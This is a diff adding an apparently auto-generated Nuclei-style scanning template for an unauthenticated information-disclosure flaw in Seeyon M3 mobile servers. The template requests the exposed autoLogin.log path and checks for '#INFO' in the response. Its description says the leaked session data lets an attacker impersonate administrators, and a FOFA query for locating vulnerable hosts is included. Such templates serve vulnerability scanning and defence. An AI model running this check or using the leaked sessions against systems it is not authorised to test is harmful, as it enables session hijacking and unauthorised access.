@@ -1,0 +1,46 @@
+id: ZhiyuanM3-autoLogin_log-information-disclosure
+
+info:
+  name: 致远M3-autoLogin_log-敏感信息泄露漏洞
+  author: candada
+  severity: high
+  description: '致远互联M3企业移动协同管理平台，全面覆盖各种工作场景，通过智能化的办公和业务场景融合，为企业构建新一代的移动智能工作方式。其接口存在未授权信息泄露，攻击者可根据泄露的session信息，伪装成通过验证的管理员/用户进行恶意操作。'
+  reference:
+  tags: 2024,致远,information-disclosure,
+  metadata:
+    max-request: 1
+    fofa-query: title="M3-Server"
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+      
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /mobile_portal/logs/autoLogin.log HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '#INFO'
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-05-08 15:39:52
